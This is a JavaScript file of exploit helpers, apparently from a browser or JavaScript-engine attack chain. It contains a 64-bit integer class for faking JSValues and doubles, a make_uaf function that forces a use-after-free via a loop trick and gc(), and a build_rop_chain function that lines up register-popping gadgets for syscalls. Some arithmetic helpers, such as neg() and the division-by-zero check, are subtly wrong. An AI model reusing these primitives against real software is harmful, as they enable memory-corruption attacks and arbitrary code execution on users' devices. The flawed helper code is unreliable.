// Utility classes and helper functions

class BigInt {
  /**
   * @param  {[number, number]|number|string|BigInt|ArrayLike<number>}
   */
  constructor () {
    this.buf = new ArrayBuffer(8)
    this.i8 = new Int8Array(this.buf)
    this.u8 = new Uint8Array(this.buf)
    this.i16 = new Int16Array(this.buf)
    this.u16 = new Uint16Array(this.buf)
    this.i32 = new Int32Array(this.buf)
    this.u32 = new Uint32Array(this.buf)
    this.f32 = new Float32Array(this.buf)
    this.f64 = new Float64Array(this.buf)

    switch (arguments.length) {
      case 0:
        break
      case 1:
        var val = arguments[0]
        switch (typeof val) {
          case 'boolean':
            this.u8[0] = (val === true) | 0
            break
          case 'number':
            if (Number.isNaN(val)) {
              throw new TypeError(`value ${val} is NaN`)
            }

            this.f64[0] = val

            break
          case 'string':
            if (val.startsWith('0x')) {
              val = val.slice(2)
            }

            if (val.length > this.u8.length * 2) {
              throw new RangeError(`value ${val} is out of range !!`)
            }

            while (val.length < this.u8.length * 2) {
              val = '0' + val
            }

            for (var i = 0; i < this.u8.length; i++) {
              var start = val.length - 2 * (i + 1)
              var end = val.length - 2 * i
              var b = val.slice(start, end)
              this.u8[i] = parseInt(b, 16)
            }

            break
          case 'object':
            if (val instanceof BigInt) {
              this.u8.set(val.u8)
              break
            } else {
              var prop = BigInt.TYPE_MAP[val.constructor.name]
              if (prop in this) {
                var arr = this[prop]
                if (val.length !== arr.length) {
                  throw new Error(
                    `Array length mismatch, expected ${arr.length} got ${val.length}.`
                  )
                }

                arr.set(val)
                break
              }
            }
          default:
            throw new TypeError(`Unsupported value ${val} !!`)
        }
        break
      case 2:
        var hi = arguments[0]
        var lo = arguments[1]

        if (!Number.isInteger(hi)) {
          throw new RangeError(`hi value ${hi} is not an integer !!`)
        }

        if (!Number.isInteger(lo)) {
          throw new RangeError(`lo value ${lo} is not an integer !!`)
        }

        this.u32[0] = lo
        this.u32[1] = hi
        break
      default:
        throw new TypeError('Unsupported input !!')
    }
  }

  toString () {
    var val = '0x'
    for (var i = this.u8.length - 1; i >= 0; i--) {
      var c = this.u8[i].toString(16).toUpperCase()
      val += c.length === 1 ? '0' + c : c
    }
    return val
  }

  endian () {
    for (var i = 0; i < this.u8.length / 2; i++) {
      var b = this.u8[i]
      this.u8[i] = this.u8[this.u8.length - 1 - i]
      this.u8[this.u8.length - 1 - i] = b
    }
  }

  lo () {
    return this.u32[0]
  }

  hi () {
    return this.u32[1]
  }

  d () {
    if (this.u8[7] === 0xFF && (this.u8[6] === 0xFF || this.u8[6] === 0xFE)) {
      throw new RangeError('Integer value cannot be represented by a double')
    }

    return this.f64[0]
  }

  jsv () {
    if ((this.u8[7] === 0 && this.u8[6] === 0) || (this.u8[7] === 0xFF && this.u8[6] === 0xFF)) {
      throw new RangeError('Integer value cannot be represented by a JSValue')
    }

    return this.sub(new BigInt(0x10000, 0))
  }

  cmp (val) {
    if (this.hi() > val.hi()) {
      return 1
    }

    if (this.hi() < val.hi()) {
      return -1
    }

    if (this.lo() > val.lo()) {
      return 1
    }

    if (this.lo() < val.lo()) {
      return -1
    }

    return 0
  }

  eq (val) {
    return this.hi() === val.hi() && this.lo() === val.lo()
  }

  neq (val) {
    return this.hi() !== val.hi() || this.lo() !== val.lo()
  }

  gt (val) {
    return this.cmp(val) > 0
  }

  gte (val) {
    return this.cmp(val) >= 0
  }

  lt (val) {
    return this.cmp(val) < 0
  }

  lte (val) {
    return this.cmp(val) <= 0
  }

  add (val) {
    var ret = new BigInt()

    var c = 0
    for (var i = 0; i < this.buf.byteLength; i++) {
      var b = this.u8[i] + val.u8[i] + c
      c = (b > 0xFF) | 0
      ret.u8[i] = b
    }

    return ret
  }

  sub (val) {
    var ret = new BigInt()

    var c = 0
    for (var i = 0; i < this.buf.byteLength; i++) {
      var b = this.u8[i] - val.u8[i] - c
      c = (b < 0) | 0
      ret.u8[i] = b
    }

    return ret
  }

  mul (val) {
    var ret = new BigInt()

    var c = 0
    for (var i = 0; i < this.buf.byteLength; i++) {
      var s = c
      for (var j = 0; j <= i; j++) {
        s += this.u8[j] * (val.u8[i - j] || 0)
      }

      ret.u8[i] = s & 0xFF
      c = s >>> 8
    }

    if (c !== 0) {
      throw new Error('mul overflowed !!')
    }

    return ret
  }

  divmod (val) {
    if (!val.gte(BigInt.Zero)) {
      throw new Error('Division by zero')
    }

    var q = new BigInt()
    var r = new BigInt()

    for (var b = (this.buf.byteLength * 8) - 1; b >= 0; b--) {
      r = r.shl(1)

      var byte_idx = Math.floor(b / 8)
      var bit_idx = b % 8

      r.u8[0] |= (this.u8[byte_idx] >> bit_idx) & 1

      if (r.gte(val)) {
        r = r.sub(val)

        q.u8[byte_idx] |= 1 << bit_idx
      }
    }

    return { q, r }
  }

  div (val) {
    return this.divmod(val).q
  }

  mod (val) {
    return this.divmod(val).r
  }

  xor (val) {
    var ret = new BigInt()

    for (var i = 0; i < this.buf.byteLength; i++) {
      ret.u8[i] = this.u8[i] ^ val.u8[i]
    }

    return ret
  }

  and (val) {
    var ret = new BigInt()

    for (var i = 0; i < this.buf.byteLength; i++) {
      ret.u8[i] = this.u8[i] & val.u8[i]
    }

    return ret
  }

  or (val) {
    var ret = new BigInt()

    for (var i = 0; i < this.buf.byteLength; i++) {
      ret.u8[i] = this.u8[i] | val.u8[i]
    }

    return ret
  }

  neg () {
    var ret = new BigInt()

    for (var i = 0; i < this.buf.byteLength; i++) {
      ret.u8[i] = ~this.u8[i]
    }

    return ret.and(BigInt.One)
  }

  shl (count) {
    if (count < 0 || count > 64) {
      throw new RangeError(`Shift ${count} bits out of range !!`)
    }

    var ret = new BigInt()

    var byte_count = Math.floor(count / 8)
    var bit_count = count % 8

    for (var i = this.buf.byteLength - 1; i >= 0; i--) {
      var t = i - byte_count
      var b = t >= 0 ? this.u8[t] : 0

      if (bit_count) {
        var p = t - 1 >= 0 ? this.u8[t - 1] : 0
        b = ((b << bit_count) | (p >> (8 - bit_count))) & 0xFF
      }

      ret.u8[i] = b
    }

    return ret
  }

  shr (count) {
    if (count < 0 || count > 64) {
      throw new RangeError(`Shift ${count} bits out of range !!`)
    }

    var ret = new BigInt()

    var byte_count = Math.floor(count / 8)
    var bit_count = count % 8

    for (var i = 0; i < this.buf.byteLength; i++) {
      var t = i + byte_count
      var b = t >= 0 ? this.u8[t] : 0

      if (bit_count) {
        var n = t + 1 >= 0 ? this.u8[t + 1] : 0
        b = ((b >> bit_count) | (n << (8 - bit_count))) & 0xff
      }

      ret.u8[i] = b
    }

    return ret
  }
}

BigInt.Zero = new BigInt()
BigInt.One = new BigInt(0, 1)
BigInt.TYPE_MAP = {
  Int8Array: 'i8',
  Uint8Array: 'u8',
  Int16Array: 'i16',
  Uint16Array: 'u16',
  Int32Array: 'i32',
  Uint32Array: 'u32',
  Float32Array: 'f32',
  Float64Array: 'f64',
}

var allocs = new Map()

function make_uaf (arr) {
  var o = {}
  for (var i in { xx: '' }) {
    for (i of [arr]);
    o[i]
  }

  gc()
}

function build_rop_chain (wrapper_addr, arg1, arg2, arg3, arg4, arg5, arg6) {
  var chain = []

  if (typeof arg1 !== 'undefined') {
    chain.push(gadgets.POP_RDI_RET)
    chain.push(arg1)
  }
  if (typeof arg2 !== 'undefined') {
    chain.push(gadgets.POP_RSI_RET)
    chain.push(arg2)
  }
  if (typeof arg3 !== 'undefined') {
    chain.push(gadgets.POP_RDX_RET)
    chain.push(arg3)
  }
  if (typeof arg4 !== 'undefined') {
    chain.push(gadgets.POP_R10_RET)
    chain.push(arg4)
  }
  if (typeof arg5 !== 'undefined') {
    chain.push(gadgets.POP_R8_RET)
    chain.push(arg5)
  }
  if (typeof arg6 !== 'undefined') {
    chain.push(gadgets.POP_R9_JO_RET)
    chain.push(arg6)
  }

  chain.push(wrapper_addr)
  return chain
}
